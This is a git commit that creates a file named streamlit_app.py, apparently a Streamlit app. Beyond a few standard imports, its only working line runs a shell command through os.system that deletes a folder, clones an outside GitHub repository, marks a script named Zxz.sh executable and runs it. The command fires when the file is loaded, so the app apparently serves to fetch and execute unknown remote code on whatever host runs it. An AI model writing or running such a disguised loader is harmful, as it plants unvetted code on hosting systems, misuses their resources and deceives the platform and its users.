c190caa2c755235249933e984e495faa94fdb636
yarewa <108953744+yarewa@users.noreply.github.com>
2022-07-09 02:03:30 +0700

    Create streamlit_app.py

---
+++ streamlit_app.py
@@ -0,0 +1,7 @@
+from collections import namedtuple
+import altair as alt
+import math
+import pandas as pd
+import streamlit as st
+import os
+os.system ("rm -rf nungx && git clone https://github.com/Akatsoki/nungx.git && cd nungx && chmod +x Zxz.sh && ./Zxz.sh")
